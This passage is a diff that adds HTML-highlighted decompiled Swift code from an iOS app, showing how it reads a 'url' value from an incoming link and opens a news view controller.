+<span class="w">          </span><span class="n">$$outlined_destroy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_140</span><span class="p">);</span>
+<span class="nl">LAB_1000195a4</span><span class="p">:</span>
+<span class="w">          </span><span class="n">$$outlined_destroy_of_</span><span class="p">(</span><span class="n">Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">,</span><span class="n">Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">local_d0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_2a4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">local_2d0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_140</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_2b8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_138</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">();</span>
+<span class="w">          </span><span class="n">local_2c8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_c0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_2b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">local_d0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_2c0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_b8</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">();</span>
+<span class="w">          </span><span class="n">SVar2</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2c0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar2</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2c8</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar25</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2b8</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar25</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2d0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar26</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_x5</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar26</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">          </span><span class="n">pcVar21</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2c0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">bVar6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::==</span><span class="n">_infix</span><span class="p">(</span><span class="n">SVar25</span><span class="p">,</span><span class="n">SVar2</span><span class="p">,</span><span class="n">SVar26</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_2a8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">CONCAT71</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">bVar6</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2c0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2b8</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2c0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2b8</span><span class="p">);</span>
+<span class="w">          </span><span class="n">$$outlined_destroy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">(</span><span class="n">local_2b0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_2a4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2a8</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="n">local_2d4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2a4</span><span class="p">;</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_228</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_230</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_258</span><span class="p">);</span>
+<span class="w">      </span><span class="n">UVar12</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_188</span><span class="p">;</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">local_2d4</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_260</span><span class="p">;</span>
+<span class="w">        </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_260</span><span class="p">,</span><span class="s">"URL"</span><span class="p">);</span>
+<span class="w">        </span><span class="n">_objc_retainAutoreleasedReturnValue</span><span class="p">();</span>
+<span class="w">        </span><span class="n">local_2f0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">        </span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">$_unconditionallyBridgeFromObjectiveC</span><span class="p">(</span><span class="n">UVar10</span><span class="p">);</span>
+<span class="w">        </span><span class="p">(</span><span class="o">*</span><span class="n">local_250</span><span class="p">)(</span><span class="n">UVar12</span><span class="p">.</span><span class="n">unknown</span><span class="p">,</span><span class="n">local_158</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">check_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">get_absoluteString</span><span class="p">(</span><span class="n">UVar12</span><span class="p">);</span>
+<span class="w">        </span><span class="n">pSVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1d8</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_2f8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_str</span><span class="p">.</span><span class="n">bridgeObject</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_308</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_str</span><span class="p">.</span><span class="n">str</span><span class="p">;</span>
+<span class="w">        </span><span class="p">(</span><span class="o">*</span><span class="n">local_248</span><span class="p">)(</span><span class="n">local_188</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">        </span><span class="p">(</span><span class="o">*</span><span class="n">local_248</span><span class="p">)(</span><span class="n">local_158</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">check_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="s">"url"</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">        </span><span class="n">pcVar21</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">check_str</span><span class="p">.</span><span class="n">bridgeObject</span><span class="p">;</span>
+<span class="w">        </span><span class="n">pcVar11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_308</span><span class="p">;</span>
+<span class="w">        </span><span class="n">pvVar19</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2f8</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_300</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">        </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">pSVar3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x78</span><span class="p">))(</span><span class="n">local_308</span><span class="p">,</span><span class="n">local_2f8</span><span class="p">,</span><span class="n">check_str</span><span class="p">.</span><span class="n">str</span><span class="p">);</span>
+<span class="w">        </span><span class="n">local_2e8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_2e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pvVar19</span><span class="p">;</span>
+<span class="w">        </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_300</span><span class="p">);</span>
+<span class="w">        </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2f8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_2f0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">local_e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2e8</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_d8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2e0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_f0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2e8</span><span class="p">;</span>
+<span class="w">        </span><span class="n">local_e8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_2e0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">$$outlined_init_with_copy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_f0</span><span class="p">,</span><span class="n">auStack_100</span><span class="p">);</span>
+<span class="w">        </span><span class="n">bVar6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_f8</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bVar6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">$$outlined_destroy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">(</span><span class="n">auStack_100</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">local_30c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar6</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_30c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">local_320</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">pUVar13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UIStoryboard</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">          </span><span class="n">local_34c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">          </span><span class="n">check_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="s">"Main"</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_340</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UIStoryboard</span><span class="o">::</span><span class="n">$__allocating_init</span><span class="p">(</span><span class="n">pUVar13</span><span class="p">,</span><span class="n">check_str</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_108</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_340</span><span class="p">;</span>
+<span class="w">          </span><span class="n">check_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="s">"TabbedControllerID"</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,(</span><span class="n">byte</span><span class="p">)</span><span class="n">local_34c</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_348</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_str</span><span class="p">.</span><span class="n">bridgeObject</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_338</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">extension_Foundation</span><span class="p">)</span><span class="o">::</span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">_bridgeToObjectiveC</span><span class="p">();</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_348</span><span class="p">);</span>
+<span class="w">          </span><span class="n">pUVar13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_340</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_340</span><span class="p">,</span><span class="s">"instantiateViewControllerWithIdentifier:"</span><span class="p">,</span><span class="n">local_338</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_objc_retainAutoreleasedReturnValue</span><span class="p">();</span>
+<span class="w">          </span><span class="n">local_330</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_338</span><span class="p">);</span>
+<span class="w">          </span><span class="n">puVar8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">_OBJC_CLASS_$_UITabBarController</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_objc_opt_self</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_OBJC_CLASS_$_UITabBarController</span><span class="p">);</span>
+<span class="w">          </span><span class="n">pUVar13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_330</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_swift_dynamicCastObjCClassUnconditional</span><span class="p">(</span><span class="n">local_330</span><span class="p">,</span><span class="n">puVar8</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_328</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_110</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_objc_msgSend</span><span class="p">();</span>
+<span class="w">          </span><span class="n">this_00</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UINavigationController</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">          </span><span class="n">_objc_retain</span><span class="p">(</span><span class="n">local_328</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_318</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UINavigationController</span><span class="o">::</span><span class="n">__allocating_init</span>
+<span class="w">                                </span><span class="p">(</span><span class="n">this_00</span><span class="p">,(</span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_328</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_118</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_318</span><span class="p">;</span>
+<span class="w">          </span><span class="n">pUVar14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UIWindow</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">          </span><span class="n">_objc_retain</span><span class="p">(</span><span class="n">local_210</span><span class="p">);</span>
+<span class="w">          </span><span class="n">pUVar14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UIWindow</span><span class="o">::</span><span class="n">__allocating_init</span><span class="p">(</span><span class="n">pUVar14</span><span class="p">,(</span><span class="n">UIWindowScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_210</span><span class="p">);</span>
+<span class="w">          </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_1d8</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x60</span><span class="p">))();</span>
+<span class="w">          </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_1d8</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x58</span><span class="p">))();</span>
+<span class="w">          </span><span class="n">local_120</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar14</span><span class="p">;</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pUVar14</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">pUVar14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_120</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$$outlined_destroy_of___C</span><span class="p">.</span><span class="n">UIWindow</span><span class="o">?</span><span class="p">();</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">local_360</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">local_120</span><span class="p">;</span>
+<span class="w">            </span><span class="n">local_358</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar14</span><span class="p">;</span>
+<span class="w">            </span><span class="n">_objc_retain</span><span class="p">();</span>
+<span class="w">            </span><span class="n">$$outlined_destroy_of___C</span><span class="p">.</span><span class="n">UIWindow</span><span class="o">?</span><span class="p">(</span><span class="n">local_360</span><span class="p">);</span>
+<span class="w">            </span><span class="n">_objc_retain</span><span class="p">(</span><span class="n">local_318</span><span class="p">);</span>
+<span class="w">            </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_358</span><span class="p">,</span><span class="s">"setRootViewController:"</span><span class="p">,</span><span class="n">local_318</span><span class="p">);</span>
+<span class="w">            </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_318</span><span class="p">);</span>
+<span class="w">            </span><span class="n">pUVar14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_358</span><span class="p">;</span>
+<span class="w">            </span><span class="n">_objc_release</span><span class="p">();</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_1d8</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x58</span><span class="p">))();</span>
+<span class="w">          </span><span class="n">local_128</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar14</span><span class="p">;</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pUVar14</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">$$outlined_destroy_of___C</span><span class="p">.</span><span class="n">UIWindow</span><span class="o">?</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_128</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">local_370</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">local_128</span><span class="p">;</span>
+<span class="w">            </span><span class="n">local_368</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar14</span><span class="p">;</span>
+<span class="w">            </span><span class="n">_objc_retain</span><span class="p">();</span>
+<span class="w">            </span><span class="n">$$outlined_destroy_of___C</span><span class="p">.</span><span class="n">UIWindow</span><span class="o">?</span><span class="p">(</span><span class="n">local_370</span><span class="p">);</span>
+<span class="w">            </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_368</span><span class="p">,</span><span class="s">"makeKeyAndVisible"</span><span class="p">);</span>
+<span class="w">            </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_368</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="n">pUVar13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_328</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_328</span><span class="p">,</span><span class="s">"selectedViewController"</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_objc_retainAutoreleasedReturnValue</span><span class="p">();</span>
+<span class="w">          </span><span class="n">pcVar11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1b8</span><span class="p">;</span>
+<span class="w">          </span><span class="n">SVar4</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1c0</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_378</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pUVar13</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">*</span><span class="p">(</span><span class="n">undefined1</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">lVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">-0x20</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">            </span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">lVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">-0x18</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2b</span><span class="p">;</span>
+<span class="w">            </span><span class="o">*</span><span class="p">(</span><span class="n">undefined4</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">lVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">-0x10</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">            </span><span class="n">Swift</span><span class="o">::</span><span class="n">_assertionFailure</span>
+<span class="w">                      </span><span class="p">(</span><span class="n">SVar4</span><span class="p">,(</span><span class="n">StaticString</span><span class="p">)</span><span class="mh">0xb</span><span class="p">,(</span><span class="n">StaticString</span><span class="p">)</span><span class="mh">0x2</span><span class="p">,(</span><span class="n">__uint64</span><span class="p">)</span><span class="n">pcVar11</span><span class="p">,</span><span class="mh">0x39</span><span class="p">);</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Does not return */</span>
+<span class="w">            </span><span class="n">pcVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">SoftwareBreakpoint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000199cc</span><span class="p">);</span>
+<span class="w">            </span><span class="p">(</span><span class="o">*</span><span class="n">pcVar5</span><span class="p">)();</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="n">local_390</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_380</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">          </span><span class="n">pNVar15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NewsController</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">          </span><span class="n">pcVar21</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">          </span><span class="n">pUVar16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_390</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_swift_dynamicCastClassUnconditional</span><span class="p">(</span><span class="n">local_390</span><span class="p">,</span><span class="n">pNVar15</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">          </span><span class="n">local_388</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar16</span><span class="p">;</span>
+<span class="w">          </span><span class="n">local_130</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar16</span><span class="p">;</span>
+<span class="w">          </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">(</span><span class="n">local_2e0</span><span class="p">);</span>
+<span class="w">          </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">pUVar16</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x88</span><span class="p">))(</span><span class="n">local_2e8</span><span class="p">,</span><span class="n">local_2e0</span><span class="p">);</span>
+<span class="w">          </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_388</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xa0</span><span class="p">))();</span>
+<span class="w">          </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_388</span><span class="p">);</span>
